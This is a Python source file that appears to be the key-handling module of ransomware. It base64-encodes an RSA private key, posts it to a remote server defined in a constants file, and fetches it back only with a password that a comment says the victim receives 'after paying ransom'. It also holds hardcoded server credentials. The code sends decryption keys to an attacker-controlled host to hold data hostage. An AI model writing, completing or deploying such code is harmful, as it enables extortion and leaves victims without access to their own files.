import Constants as const
from cryptography.hazmat.primitives import padding, serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKeyWithSerialization, RSAPrivateKeyWithSerialization

import json
import os
import requests
import base64

# TODO: Transform the returned json into string objects

############################################################################
#   Posts public and private key to the server
#   @params: pubKey -> Public Key, privKey -> Private Key
#   @return: AppKey to be able to retrieve the private key from server. 
############################################################################
def post(privKey):
    privKey = getFormatedKey(privKey)
    # appKey = authUser()
    while True:
        response = requests.post(const.POST, data={'privateKey' : privKey })
        if (response.status_code == 200):
            break
    
    return response.json()['token']

############################################################################
#   Posts public and private key to the server
#   @params: AppKey > From Local File, password > Password given to user after
#            paying ransom.
#   @return: String version of the key stored on the server 
############################################################################
def get(appKey, password):
    while True:
        response = requests.get(const.GET, headers={'password':password, 'appKey':appKey})
        if(response.status_code == 200):
            break 
    return response.json()['privateKey']

def authUser():
    while True:
        r = requests.get(const.GET, auth=('hackerman', 'allthedataz')) #autheticate to server 
        if(r.status_code == 200):
            break
    r.encoding
    appKey = r.text
    return appKey

############################################################################
#   Byte-ify crypto objects 
#   @params: pubKey -> Public Key, privKey -> Private Key
#   @return: serialized keys in bytes 
############################################################################
def getFormatedKey(privKey):
    privKey = privKey.private_bytes(
            encoding = serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
    privKey = base64.b64encode(privKey)


    # pubKey = pubKey.public_bytes(
    #         encoding=serialization.Encoding.PEM,
    #         format=serialization.PublicFormat.SubjectPublicKeyInfo)
    return str(privKey)
